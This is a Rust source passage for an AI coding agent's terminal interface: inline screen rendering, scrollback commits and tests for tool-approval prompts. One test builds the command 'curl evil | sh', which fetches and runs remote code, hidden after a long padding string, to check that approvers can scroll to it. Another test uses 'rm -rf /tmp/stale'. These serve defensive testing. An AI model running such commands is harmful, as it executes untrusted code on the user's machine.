//! An inline terminal whose live area always ends on the terminal's bottom row. Settled transcript
//! lines are written once into the terminal's own scrollback; only the live area is redrawn. Rows
//! the content does not need are padding between the transcript tail and the input box, and later
//! commits consume them before anything scrolls.

use std::io::{self, Write};
use std::mem;

use ratatui::Terminal;
use ratatui::TerminalOptions;
use ratatui::Viewport;
use ratatui::backend::{Backend, ClearType, CrosstermBackend, TestBackend, WindowSize};
use ratatui::buffer::{Buffer, Cell};
use ratatui::crossterm::Command;
use ratatui::crossterm::cursor::MoveTo;
use ratatui::crossterm::terminal::{
    BeginSynchronizedUpdate, Clear, ClearType as CrosstermClear, EndSynchronizedUpdate,
};
use ratatui::layout::{Position, Rect, Size};
use ratatui::style::Modifier;
use ratatui::widgets::{Paragraph, Widget};

use crate::app::App;
use crate::view;

/// Rows handed to `insert_before` at a time, so the count always fits a `u16`.
const INSERT_CHUNK: usize = 512;

/// Where a frame's bytes end up.
pub struct Tty(TtyKind);

enum TtyKind {
    /// A second handle on the stdout descriptor: std's `Stdout` is a `LineWriter`, which would
    /// split a frame at every newline it holds.
    #[cfg(unix)]
    Fd(std::fs::File),
    Std(io::Stdout),
}

impl Tty {
    pub fn stdout() -> Self {
        #[cfg(unix)]
        {
            use std::os::fd::AsFd;
            if let Ok(fd) = io::stdout().as_fd().try_clone_to_owned() {
                return Tty(TtyKind::Fd(fd.into()));
            }
        }
        Tty(TtyKind::Std(io::stdout()))
    }

    /// Without the second descriptor, for a writer that never writes.
    pub fn std() -> Self {
        Tty(TtyKind::Std(io::stdout()))
    }
}

impl Write for Tty {
    fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
        match &mut self.0 {
            #[cfg(unix)]
            TtyKind::Fd(file) => file.write(bytes),
            TtyKind::Std(out) => out.write(bytes),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        match &mut self.0 {
            #[cfg(unix)]
            TtyKind::Fd(file) => file.flush(),
            TtyKind::Std(out) => out.flush(),
        }
    }
}

/// Collects everything written into one buffer and hands it to `W` in a single write when the
/// frame ends, so a frame reaches the terminal as one chunk. `CrosstermBackend` flushes its
/// writer at several points inside a frame; those flushes do nothing while a frame is open.
pub struct FrameWriter<W: Write = Tty> {
    out: W,
    frame: Vec<u8>,
    open: bool,
    discard: bool,
}

impl<W: Write> FrameWriter<W> {
    pub fn new(out: W) -> Self {
        FrameWriter {
            out,
            frame: Vec::new(),
            open: false,
            discard: false,
        }
    }

    /// For the stand-in backend left in a terminal that is about to drop: its cleanup writes
    /// must not reach the real terminal.
    pub fn discarding(out: W) -> Self {
        FrameWriter {
            discard: true,
            ..Self::new(out)
        }
    }

    fn queue(&mut self, command: impl Command) {
        let mut ansi = String::new();
        command
            .write_ansi(&mut ansi)
            .expect("writing to a String cannot fail");
        self.frame.extend_from_slice(ansi.as_bytes());
    }

    fn begin(&mut self) {
        self.open = true;
        self.queue(BeginSynchronizedUpdate);
    }

    fn end(&mut self) -> io::Result<()> {
        self.queue(EndSynchronizedUpdate);
        self.open = false;
        self.drain()
    }

    fn drain(&mut self) -> io::Result<()> {
        let frame = mem::take(&mut self.frame);
        if self.discard {
            return Ok(());
        }
        if !frame.is_empty() {
            self.out.write_all(&frame)?;
        }
        self.out.flush()
    }
}

impl FrameWriter<Tty> {
    pub fn stdout() -> Self {
        Self::new(Tty::stdout())
    }
}

impl<W: Write> Write for FrameWriter<W> {
    fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
        self.frame.extend_from_slice(bytes);
        Ok(bytes.len())
    }

    fn flush(&mut self) -> io::Result<()> {
        if self.open { Ok(()) } else { self.drain() }
    }
}

/// A backend that frames its output, so one frame is one write.
pub trait Framed: Backend {
    /// Starts collecting output, opening with the synchronized-update marker.
    fn begin_frame(&mut self);

    /// Closes the synchronized update and writes everything collected since `begin_frame`.
    fn end_frame(&mut self) -> Result<(), Self::Error>;

    /// Erases the screen and then the scrollback, and homes the cursor.
    fn purge(&mut self) -> Result<(), Self::Error>;
}

impl<W: Write> Framed for CrosstermBackend<FrameWriter<W>> {
    fn begin_frame(&mut self) {
        self.writer_mut().begin();
    }

    fn end_frame(&mut self) -> io::Result<()> {
        self.writer_mut().end()
    }

    fn purge(&mut self) -> io::Result<()> {
        let writer = self.writer_mut();
        // The scrollback goes second: clearing the screen is what makes tmux move its rows into
        // history, and clearing history first would leave those behind.
        writer.queue(Clear(CrosstermClear::All));
        writer.queue(Clear(CrosstermClear::Purge));
        writer.queue(MoveTo(0, 0));
        Ok(())
    }
}

impl Framed for TestBackend {
    // Nothing is written anywhere, so there is nothing to collect.
    fn begin_frame(&mut self) {}

    fn end_frame(&mut self) -> Result<(), Self::Error> {
        Ok(())
    }

    fn purge(&mut self) -> Result<(), Self::Error> {
        // The backend keeps its scrollback to itself, so a fresh one stands for the cleared one.
        let size = self.size()?;
        *self = TestBackend::new(size.width, size.height);
        Ok(())
    }
}

/// A backend that can be told where the cursor is, so a rebuilt terminal does not have to ask.
pub trait Anchor: Backend {
    /// Answers the next cursor-position query with `at`.
    fn arm(&mut self, at: Position);

    fn begin_frame(&mut self) {}

    fn end_frame(&mut self) -> Result<(), Self::Error> {
        Ok(())
    }

    /// Erases the screen and then the scrollback, and homes the cursor.
    fn purge(&mut self) -> Result<(), Self::Error>;
}

impl Anchor for TestBackend {
    // A test backend answers from its own cursor.
    fn arm(&mut self, _at: Position) {}

    fn purge(&mut self) -> Result<(), Self::Error> {
        Framed::purge(self)
    }
}

/// Wraps a backend so exactly one cursor-position query can be answered locally. On a real
/// terminal that query is a round trip through stdin, which is slow over ssh and times out on
/// terminals that do not answer.
pub struct Anchored<B> {
    inner: B,
    anchor: Option<Position>,
}

impl<B> Anchored<B> {
    pub fn new(inner: B) -> Self {
        Anchored {
            inner,
            anchor: None,
        }
    }
}

impl<B: Framed> Anchor for Anchored<B> {
    fn arm(&mut self, at: Position) {
        self.anchor = Some(at);
    }

    fn begin_frame(&mut self) {
        self.inner.begin_frame();
    }

    fn end_frame(&mut self) -> Result<(), Self::Error> {
        self.inner.end_frame()
    }

    fn purge(&mut self) -> Result<(), Self::Error> {
        self.inner.purge()
    }
}

impl<B: Backend> Backend for Anchored<B> {
    type Error = B::Error;

    fn draw<'a, I>(&mut self, content: I) -> Result<(), Self::Error>
    where
        I: Iterator<Item = (u16, u16, &'a Cell)>,
    {
        self.inner.draw(content)
    }

    fn append_lines(&mut self, n: u16) -> Result<(), Self::Error> {
        self.inner.append_lines(n)
    }

    fn hide_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.hide_cursor()
    }

    fn show_cursor(&mut self) -> Result<(), Self::Error> {
        self.inner.show_cursor()
    }

    fn get_cursor_position(&mut self) -> Result<Position, Self::Error> {
        match self.anchor.take() {
            Some(at) => Ok(at),
            None => self.inner.get_cursor_position(),
        }
    }

    fn set_cursor_position<P: Into<Position>>(&mut self, position: P) -> Result<(), Self::Error> {
        self.inner.set_cursor_position(position)
    }

    fn clear(&mut self) -> Result<(), Self::Error> {
        self.inner.clear()
    }

    fn clear_region(&mut self, clear_type: ClearType) -> Result<(), Self::Error> {
        self.inner.clear_region(clear_type)
    }

    fn size(&self) -> Result<Size, Self::Error> {
        self.inner.size()
    }

    fn window_size(&mut self) -> Result<WindowSize, Self::Error> {
        self.inner.window_size()
    }

    fn flush(&mut self) -> Result<(), Self::Error> {
        self.inner.flush()
    }

    fn scroll_region_up(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_up(region, line_count)
    }

    fn scroll_region_down(
        &mut self,
        region: std::ops::Range<u16>,
        line_count: u16,
    ) -> Result<(), Self::Error> {
        self.inner.scroll_region_down(region, line_count)
    }
}

/// Blanks the rows from `top` down one at a time and leaves the cursor on the last. Erasing from
/// the top row to the end of the screen in one go makes tmux move everything visible into its
/// scrollback, which is where the prompt box and live rows would otherwise pile up.
fn erase_rows<B: Backend>(backend: &mut B, top: u16) -> Result<(), B::Error> {
    let bottom = backend.size()?.height;
    for row in top..bottom {
        backend.set_cursor_position(Position::new(0, row))?;
        backend.clear_region(ClearType::CurrentLine)?;
    }
    Ok(())
}

pub struct Screen<B: Backend + Anchor> {
    terminal: Terminal<B>,
    height: u16,
    /// A stand-in left in the old `Terminal` while its backend moves to the new one.
    placeholder: fn() -> B,
    /// The next draw must write every cell of the viewport, blanks included.
    repaint: bool,
    /// The terminal's size when the live area was last laid out.
    size: Size,
}

impl<B: Backend + Anchor> Screen<B> {
    /// The live area starts as the whole screen: earlier output above the cursor scrolls into the
    /// terminal's history.
    pub fn new(backend: B, placeholder: fn() -> B) -> Result<Self, B::Error> {
        let size = backend.size()?;
        let height = size.height;
        let terminal = Terminal::with_options(
            backend,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        Ok(Screen {
            terminal,
            height,
            placeholder,
            repaint: false,
            size,
        })
    }

    /// Commits the transcript rows that no longer fit above the input, sizes the live area to
    /// reach the bottom row, and draws it. A transcript that fits stays in the live area, so a
    /// short one sits directly above the input instead of at the top of the screen.
    pub fn render(&mut self, app: &mut App) -> Result<(), B::Error> {
        self.framed(app, false)
    }

    /// Writes everything still held back to scrollback, for exit: the live area is about to be
    /// cleared.
    pub fn commit_all(&mut self, app: &mut App) -> Result<(), B::Error> {
        self.framed(app, true)
    }

    /// The end of the frame is written even when drawing failed, so no synchronized update is
    /// left open on the terminal; the drawing error is the one reported.
    fn framed(&mut self, app: &mut App, all: bool) -> Result<(), B::Error> {
        self.terminal.backend_mut().begin_frame();
        let drawn = self.draw_frame(app, all);
        let ended = self.terminal.backend_mut().end_frame();
        drawn.and(ended)
    }

    fn draw_frame(&mut self, app: &mut App, all: bool) -> Result<(), B::Error> {
        // ratatui's own resize of an inline viewport erases from the viewport's top (the whole
        // screen when it narrows), and tmux moves what is erased into its history, where the old
        // live area stays as a copy above the new one; the terminal's reflow scrambles the old
        // rows besides. So a resize reprints the transcript at the new size instead, and the
        // rebuilt terminal leaves ratatui nothing to resize.
        let size = self.terminal.size()?;
        if size != self.size {
            self.size = size;
            app.reprint = true;
        }
        if mem::take(&mut app.reprint) {
            app.shown_mut().recommit();
            self.reprint()?;
        }
        self.terminal.autoresize()?;
        let width = self.terminal.get_frame().area().width;
        let terminal_height = self.terminal.size()?.height;
        let columns = usize::from(width).max(1);
        let lines = if all {
            let (shown, theme) = app.shown_with_theme();
            shown.commit_all(columns, theme)
        } else {
            let (shown, theme) = app.shown_with_theme();
            let mut lines = shown.take_retired(columns, theme);
            let chrome = view::chrome(app, width, terminal_height);
            let held = app.shown().live_lines(columns, &app.theme).len();
            let over = (held + chrome).saturating_sub(usize::from(terminal_height));
            let (shown, theme) = app.shown_with_theme();
            let released = shown.commit_within(columns, theme, over);
            if !released.is_empty() && app.agents.is_some() {
                app.committed_under_overlay = true;
            }
            lines.extend(released);
            lines
        };
        let content = view::height(app, width, terminal_height);
        let top = self.terminal.get_frame().area().y;
        let free = usize::from(terminal_height.saturating_sub(top)).saturating_sub(lines.len());
        let wanted = usize::from(content)
            .max(free)
            .min(usize::from(terminal_height)) as u16;
        if wanted != self.height {
            self.rebuild(wanted)?;
        }
        // ratatui scrolls the rows above the viewport as a region, and a one-row region is
        // invalid DECSTBM that terminals ignore, so the whole screen scrolls with the viewport
        // still in it. The viewport is repainted from scratch to undo that. Each settled line
        // after the first is drawn over a row ratatui assumes is clear, and its diff skips blank
        // cells, so the row would keep its live text wherever the line is blank. Marking the
        // blanks as concealed makes them differ from an empty cell and be written as spaces,
        // which overwrites the text without first blanking the row.
        let one_row_region = self.terminal.get_frame().area().y <= 1 && !lines.is_empty();
        if one_row_region {
            // When the viewport fills the screen, ratatui puts back its top row after each
            // insert, from the buffer it last drew. Blank, that row is a no-op, where the stale
            // row would overwrite a line that has just scrolled up into it.
            self.set_previous(Cell::EMPTY);
        }
        for chunk in lines.chunks(INSERT_CHUNK) {
            let rows = chunk.to_vec();
            self.terminal.insert_before(chunk.len() as u16, |buf| {
                Paragraph::new(rows).render(buf.area, buf);
                if one_row_region {
                    for cell in buf.content.iter_mut().filter(|c| **c == Cell::EMPTY) {
                        cell.modifier.insert(Modifier::HIDDEN);
                    }
                }
            })?;
        }
        if one_row_region {
            self.rebuild(self.height)?;
        }
        if mem::take(&mut self.repaint) {
            // Installed this late because `insert_before` reads the buffers. Diffing
            // against a private-use glyph makes the draw write every cell, so the old rows are
            // overwritten in place instead of being blanked first. Accepted limitation: a literal
            // U+E000 in default style (rare, e.g. in model text) could stay stale for one frame.
            // "\u{1}" is not usable: ratatui panics in `cell_width` on it.
            self.set_previous(Cell::new("\u{E000}"));
        }
        self.terminal.draw(|frame| view::draw(frame, app))?;
        Ok(())
    }

    /// Makes ratatui believe the viewport holds `cell` everywhere, so the next draw writes every
    /// cell that differs from it.
    fn set_previous(&mut self, cell: Cell) {
        let area = self.terminal.get_frame().area();
        *self.terminal.current_buffer_mut() = Buffer::filled(area, cell);
        self.terminal.swap_buffers();
    }

    /// Erases the screen and the scrollback, and starts the live area over at the top row, as the
    /// whole screen. The caller writes the transcript again from its first row.
    pub fn reprint(&mut self) -> Result<(), B::Error> {
        self.terminal.backend_mut().purge()?;
        let height = self.terminal.size()?.height;
        self.rebuild_at(0, height)
    }

    /// ratatui cannot resize an inline viewport, so the terminal is rebuilt at the same top row.
    fn rebuild(&mut self, height: u16) -> Result<(), B::Error> {
        let top = self.terminal.get_frame().area().y;
        self.rebuild_at(top, height)
    }

    fn rebuild_at(&mut self, top: u16, height: u16) -> Result<(), B::Error> {
        let top = Position::new(0, top);
        let backend = self.terminal.backend_mut();
        backend.set_cursor_position(top)?;
        let mut real = mem::replace(backend, (self.placeholder)());
        real.arm(top);
        let terminal = Terminal::with_options(
            real,
            TerminalOptions {
                viewport: Viewport::Inline(height),
            },
        )?;
        // A freshly built Terminal leaves the cursor shown, so hide it after the swap.
        self.terminal = terminal;
        self.terminal.hide_cursor()?;
        self.height = height;
        self.repaint = true;
        Ok(())
    }

    /// Clears the live area and leaves the cursor at its top, for exit.
    pub fn clear_live(&mut self) -> Result<(), B::Error> {
        let top = self.terminal.get_frame().area().y;
        let backend = self.terminal.backend_mut();
        erase_rows(backend, top)?;
        backend.set_cursor_position(Position::new(0, top))?;
        backend.flush()
    }

    /// Rebuilds the live area at its previous top and marks it for a full repaint on the next
    /// render, after a child process has had the terminal.
    pub fn resume(&mut self) -> Result<(), B::Error> {
        self.rebuild(self.height)
    }

    pub fn backend(&self) -> &B {
        self.terminal.backend()
    }

    /// The viewport rect.
    pub fn area(&mut self) -> Rect {
        self.terminal.get_frame().area()
    }
}

/// Rows of text, one string per line, for tests.
#[cfg(test)]
fn rows(buffer: &ratatui::buffer::Buffer) -> Vec<String> {
    let width = usize::from(buffer.area.width);
    buffer
        .content()
        .chunks(width)
        .map(|row| row.iter().map(|c| c.symbol()).collect::<String>())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use fontaine_core::config::PermissionMode;
    use fontaine_core::permissions::{ApprovalRequest, Offers};
    use fontaine_core::turn::SessionEvent;
    use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use tokio::sync::oneshot;

    fn placeholder() -> TestBackend {
        TestBackend::new(1, 1)
    }

    fn screen(width: u16, height: u16) -> Screen<TestBackend> {
        Screen::new(TestBackend::new(width, height), placeholder).unwrap()
    }

    fn app() -> App {
        App::new(PermissionMode::Manual, "model".into())
    }

    /// Scrollback followed by the visible rows.
    fn everything(screen: &Screen<TestBackend>) -> Vec<String> {
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()));
        all
    }

    fn above(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let top = usize::from(screen.area().top());
        let mut all = rows(screen.backend().scrollback());
        all.extend(rows(screen.backend().buffer()).into_iter().take(top));
        all
    }

    fn live(screen: &mut Screen<TestBackend>) -> Vec<String> {
        let area = screen.area();
        rows(screen.backend().buffer())
            .into_iter()
            .skip(usize::from(area.top()))
            .take(usize::from(area.height))
            .collect()
    }

    fn nonblank(rows: Vec<String>) -> Vec<String> {
        rows.into_iter()
            .map(|r| r.trim_end().to_string())
            .filter(|r| !r.is_empty())
            .collect()
    }

    fn approval_request(command: &str) -> ApprovalRequest {
        ApprovalRequest {
            tool: "shell".into(),
            agent: "main".into(),
            agent_name: String::new(),
            tool_use_id: None,
            args: serde_json::json!({ "command": command }),
            summary: command.into(),
            tier: fontaine_core::tier::Tier::CriticalPath,
            reason: "needs approval".into(),
            offers: Offers::default(),
            proposed_rule: None,
            preview: None,
        }
    }

    /// The index of the input box's top border among the visible rows.
    fn input_top(screen: &mut Screen<TestBackend>) -> usize {
        rows(screen.backend().buffer())
            .iter()
            .position(|r| r.contains("message ·"))
            .expect("the input box is drawn")
    }

    fn warning(app: &mut App, text: &str) {
        app.transcript.warning(text, Some(format!("fix `{text}`")));
    }

    #[test]
    fn a_short_transcript_stays_above_the_input_and_nothing_is_committed() {
        let mut screen = screen(40, 12);
        let mut app = app();
        app.transcript.user("hello".into());
        app.on_event(SessionEvent::Assistant("the reply".into()));
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        let visible = rows(screen.backend().buffer());
        let top = input_top(&mut screen);
        assert!(visible[top - 1].contains("the reply"), "{visible:?}");
        assert!(visible[top - 3].contains("> hello"), "{visible:?}");
        assert!(visible[..top - 3].iter().all(|r| r.trim().is_empty()));
    }

    #[test]
    fn settled_lines_go_to_scrollback_once_they_no_longer_fit_above_the_input() {
        let mut screen = screen(40, 8);
        let mut app = app();
        app.transcript.user("hello".into());
        for reply in ["one", "two", "three"] {
            app.on_event(SessionEvent::Assistant(reply.into()));
        }
        screen.render(&mut app).unwrap();
        assert_eq!(nonblank(above(&mut screen)), vec!["> hello"]);
        let live = live(&mut screen).join("\n");
        assert!(live.contains("message"));
        assert!(live.contains("three"));
        assert!(!live.contains("hello"));
    }

    #[test]
    fn a_streaming_reply_commits_only_completed_rows_and_only_when_over_budget() {
        let mut screen = screen(10, 8);
        let mut app = app();
        app.on_event(SessionEvent::AssistantDelta("abc".into()));
        screen.render(&mut app).unwrap();
        assert!(nonblank(above(&mut screen)).is_empty());
        assert!(live(&mut screen).join("\n").contains("abc"));
        app.on_event(SessionEvent::AssistantDelta("defghijkl".into()));
        screen.render(&mut app).unwrap();
        assert!(
            nonblank(above(&mut screen)).is_empty(),
            "two rows fit above the input"
        );
        app.on_event(SessionEvent::AssistantDelta(
            "mnopqrstuvwxyz0123456789ABCDE".into(),
        ));
        screen.render(&mut app).unwrap();
        assert_eq!(nonblank(above(&mut screen)), vec!["abcdefghij"]);
        assert!(live(&mut screen).join("\n").contains("E"));
    }

    #[test]
    fn held_warnings_stay_anchored_while_a_reply_streams_across_the_boundary() {
        let mut screen = screen(30, 14);
        let mut app = app();
        warning(&mut app, "first");
        warning(&mut app, "second");
        screen.render(&mut app).unwrap();
        let top = input_top(&mut screen);
        let visible = rows(screen.backend().buffer());
        assert!(visible[top - 1].contains("fix `second`"), "{visible:?}");
        let mut streamed = String::new();
        for i in 0..120 {
            let word = format!("w{i} ");
            streamed.push_str(&word);
            app.on_event(SessionEvent::AssistantDelta(word));
            screen.render(&mut app).unwrap();
            if i == 2 {
                let visible = rows(screen.backend().buffer());
                assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
                assert!(visible[input_top(&mut screen) - 1].contains("w0 w1 w2"));
            }
        }
        let all = nonblank(everything(&screen));
        let warnings: Vec<&String> = all
            .iter()
            .filter(|r| r.contains("fix `") || r.contains("⚠"))
            .collect();
        assert_eq!(warnings.len(), 4, "{all:?}");
        let body: String = all
            .iter()
            .filter(|r| {
                r.starts_with('w') || r.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
            })
            .flat_map(|r| r.chars())
            .collect();
        let squeezed: String = streamed.chars().filter(|c| !c.is_whitespace()).collect();
        assert!(body.replace(' ', "").contains(&squeezed), "{all:?}");
        assert!(
            rows(screen.backend().scrollback())
                .join("\n")
                .contains("first"),
            "older entries commit before any stream row"
        );
    }

    #[test]
    fn a_long_approval_leaves_the_pending_call_live() {
        let mut screen = screen(40, 14);
        let mut app = app();
        app.on_event(SessionEvent::ToolCall {
            id: "t".into(),
            tool: "shell".into(),
            args: serde_json::json!({ "command": "sleep 9" }),
        });
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request(&"x".repeat(600)), tx);
        screen.render(&mut app).unwrap();

        assert!(
            !rows(screen.backend().scrollback())
                .join("\n")
                .contains("sleep 9"),
            "the pending call must not be written to scrollback"
        );
        assert!(live(&mut screen).join("\n").contains("sleep 9"));
    }

    #[test]
    fn a_pending_call_over_budget_is_committed_so_no_row_is_hidden() {
        let mut screen = screen(30, 8);
        let mut app = app();
        app.on_event(SessionEvent::ToolCall {
            id: "t".into(),
            tool: "shell".into(),
            args: serde_json::json!({ "command": "sleep 9" }),
        });
        for i in 0..8 {
            app.transcript.notice(format!("n{i}"));
            screen.render(&mut app).unwrap();
        }
        let all = nonblank(everything(&screen)).join("\n");
        assert_eq!(all.matches("sleep 9").count(), 1, "{all}");
        for i in 0..8 {
            assert_eq!(all.matches(&format!("· n{i}")).count(), 1, "{all}");
        }
        let held = app.transcript.live_lines(30, &app.theme).len();
        assert!(held + view::chrome(&app, 30, 8) <= 8);
    }

    #[test]
    fn an_overlay_growing_the_chrome_commits_held_entries() {
        let mut screen = screen(40, 14);
        let mut app = app();
        for i in 0..4 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("ls"), tx);
        screen.render(&mut app).unwrap();
        let held = app.transcript.live_lines(40, &app.theme).len();
        assert!(held + view::chrome(&app, 40, 14) <= 14);
        let all = nonblank(everything(&screen)).join("\n");
        for i in 0..4 {
            assert_eq!(all.matches(&format!("· n{i}")).count(), 1, "{all}");
        }
    }

    #[test]
    fn narrowing_the_terminal_commits_entries_that_stop_fitting() {
        let mut screen = screen(60, 12);
        let mut app = app();
        for i in 0..4 {
            app.transcript.notice(format!("{i} {}", "word ".repeat(10)));
        }
        screen.render(&mut app).unwrap();
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        screen.terminal.backend_mut().resize(20, 12);
        screen.render(&mut app).unwrap();
        let held = app.transcript.live_lines(20, &app.theme).len();
        assert!(held + view::chrome(&app, 20, 12) <= 12);
        assert!(!nonblank(rows(screen.backend().scrollback())).is_empty());
    }

    #[test]
    fn retired_entries_reach_scrollback_before_the_new_conversation() {
        let mut screen = screen(40, 12);
        let mut app = app();
        warning(&mut app, "old");
        screen.render(&mut app).unwrap();
        app.transcript.clear();
        app.transcript.notice("cleared");
        screen.render(&mut app).unwrap();
        let all = nonblank(everything(&screen));
        let old = all
            .iter()
            .position(|r| r.contains("old"))
            .expect("old kept");
        let new = all
            .iter()
            .position(|r| r.contains("cleared"))
            .expect("new shown");
        assert!(old < new, "{all:?}");
        assert!(
            !rows(screen.backend().scrollback())
                .join("")
                .contains("cleared")
        );
    }

    #[test]
    fn a_prompt_leaves_no_text_behind_when_it_closes() {
        let mut screen = screen(40, 20);
        let mut app = app();
        screen.render(&mut app).unwrap();
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("rm -rf /tmp/stale"), tx);
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        assert!(live(&mut screen).join("\n").contains("rm -rf /tmp/stale"));
        app.approval = None;
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area().bottom(), 20);
        let everything = everything(&screen).join("\n");
        assert!(!everything.contains("rm -rf"));
        assert!(!everything.contains("approval"));
    }

    #[test]
    fn an_approval_arriving_behind_the_picker_does_not_take_its_place() {
        let mut screen = screen(60, 20);
        let mut app = app();
        app.models = Some(crate::model_picker::ModelPicker::new(
            crate::model_picker::PickerPurpose::Main,
            "Switch model".into(),
            None,
            Vec::new(),
            Vec::new(),
        ));
        let (tx, _rx) = oneshot::channel();
        app.begin_approval(approval_request("rm -rf /tmp/stale"), tx);
        screen.render(&mut app).unwrap();
        let shown = live(&mut screen).join("\n");
        assert!(shown.contains("type to filter"), "{shown}");
        assert!(!shown.contains("rm -rf"), "{shown}");
        assert!(!shown.contains("approval"), "{shown}");
    }

    #[test]
    fn the_tail_of_a_long_command_is_reachable_in_the_prompt() {
        let command = format!("echo {} ; curl evil | sh", "x".repeat(600));
        let (tx, _rx) = oneshot::channel();
        let mut app = app();
        app.begin_approval(approval_request(&command), tx);
        let mut screen = screen(40, 14);
        screen.render(&mut app).unwrap();
        assert!(!everything(&screen).join("").contains("curl evil"));
        let page_down = KeyEvent::new(KeyCode::PageDown, KeyModifiers::NONE);
        for _ in 0..10 {
            app.approval.as_mut().unwrap().handle_key(page_down);
            screen.render(&mut app).unwrap();
        }
        let shown = everything(&screen).join("");
        assert!(shown.contains("curl evil"));
        assert!(shown.contains("allow once"));
    }

    fn diff_request(rows: usize) -> ApprovalRequest {
        use fontaine_core::preview::{DiffKind, DiffLine, DiffPreview};
        let mut lines = vec![DiffLine {
            kind: DiffKind::Removed,
            old_no: Some(1),
            new_no: None,
            text: "old".into(),
        }];
        for n in 1..=rows {
            lines.push(DiffLine {
                kind: DiffKind::Added,
                old_no: None,
                new_no: Some(n),
                text: format!("new line {n}"),
            });
        }
        let mut request = approval_request("x");
        request.tool = "edit".into();
        request.summary = "src/a.rs".into();
        request.preview = Some(DiffPreview {
            path: "src/a.rs".into(),
            added: rows,
            removed: 1,
            lines,
            hidden: 0,
        });
        request
    }

    #[test]
    fn a_prompt_with_a_preview_shows_the_diff_above_the_choices() {
        let (tx, _rx) = oneshot::channel();
        let mut app = app();
        app.begin_approval(diff_request(2), tx);
        let mut screen = screen(60, 40);
        screen.render(&mut app).unwrap();
        let shown = nonblank(live(&mut screen)).join("\n");
        assert!(shown.contains("src/a.rs  +2 -1"), "{shown}");
        assert!(shown.contains("1 -old"), "{shown}");
        assert!(shown.contains("2 +new line 2"), "{shown}");
        let at = |needle: &str| shown.find(needle).unwrap();
        assert!(at("+new line 2") < at("needs approval"));
        assert!(at("needs approval") < at("allow once"));
    }

    #[test]
    fn a_long_diff_scrolls_and_keeps_the_choices_visible() {
        let (tx, _rx) = oneshot::channel();
        let mut app = app();
        app.begin_approval(diff_request(60), tx);
        let mut screen = screen(50, 14);
        screen.render(&mut app).unwrap();
        assert!(!everything(&screen).join("\n").contains("new line 60"));
        let page_down = KeyEvent::new(KeyCode::PageDown, KeyModifiers::NONE);
        for _ in 0..20 {
            app.approval.as_mut().unwrap().handle_key(page_down);
            screen.render(&mut app).unwrap();
        }
        let shown = everything(&screen).join("\n");
        assert!(shown.contains("new line 60"), "{shown}");
        assert!(shown.contains("allow once"));
    }

    #[test]
    fn shrinking_and_committing_in_one_render_at_the_bottom_keeps_every_line_once() {
        for late in [1, 2, 6] {
            let mut screen = screen(30, 10);
            let mut app = app();
            for i in 0..8 {
                app.transcript.notice(format!("n{i}"));
                screen.render(&mut app).unwrap();
            }
            let (tx, _rx) = oneshot::channel();
            app.begin_approval(approval_request("ls"), tx);
            screen.render(&mut app).unwrap();
            app.approval = None;
            for i in 0..late {
                app.transcript.notice(format!("late{i}"));
            }
            screen.render(&mut app).unwrap();
            let history: Vec<String> = nonblank(everything(&screen))
                .into_iter()
                .filter(|r| r.starts_with("· "))
                .collect();
            let mut expected: Vec<String> = (0..8).map(|i| format!("· n{i}")).collect();
            expected.extend((0..late).map(|i| format!("· late{i}")));
            assert_eq!(history, expected, "{late} late notices");
            assert_eq!(screen.area().bottom(), 10);
        }
    }

    #[test]
    fn startup_takes_the_whole_screen_and_keeps_earlier_output_in_history() {
        let mut backend = TestBackend::new(30, 12);
        let cells: Vec<(u16, u16, Cell)> = ["one", "two", "three"]
            .iter()
            .enumerate()
            .flat_map(|(y, text)| {
                text.chars().enumerate().map(move |(x, c)| {
                    let mut cell = Cell::default();
                    cell.set_symbol(&c.to_string());
                    (x as u16, y as u16, cell)
                })
            })
            .collect();
        backend
            .draw(cells.iter().map(|(x, y, cell)| (*x, *y, cell)))
            .unwrap();
        backend.set_cursor_position(Position::new(0, 4)).unwrap();
        let mut screen = Screen::new(backend, placeholder).unwrap();
        let mut app = app();
        screen.render(&mut app).unwrap();
        assert_eq!(screen.area(), Rect::new(0, 0, 30, 12));
        let history = nonblank(rows(screen.backend().scrollback()));
        assert_eq!(history, vec!["one", "two", "three"]);
        let visible = rows(screen.backend().buffer());
        assert!(visible[11].contains("manual"));
        assert!(
            visible[7..11].iter().any(|r| r.contains("message")),
            "{visible:?}"
        );
        assert!(visible[..8].iter().all(|r| r.trim().is_empty()));
    }

    #[test]
    fn first_entries_sit_directly_above_the_input() {
        let mut screen = screen(30, 12);
        let mut app = app();
        app.transcript.notice(String::from("a"));
        app.transcript.notice(String::from("b"));
        screen.render(&mut app).unwrap();
        let visible = rows(screen.backend().buffer());
        let top = input_top(&mut screen);
        assert!(visible[top - 2].contains("a"), "{visible:?}");
        assert!(visible[top - 1].contains("b"), "{visible:?}");
        assert!(visible[..top - 2].iter().all(|r| r.trim().is_empty()));
        assert!(nonblank(rows(screen.backend().scrollback())).is_empty());
        assert_eq!(screen.area().bottom(), 12);
    }

    /// Renders a scripted session and checks the bottom-row rule after every step.
    fn scripted(screen: &mut Screen<TestBackend>, height: u16) -> Vec<String> {
        let mut app = app();
        let mut expected = Vec::new();
        let step = |screen: &mut Screen<TestBackend>, app: &mut App| {
            screen.render(app).unwrap();
            let area = screen.area();
            assert_eq!(area.bottom(), height);
            let content = view::height(app, area.width, height);
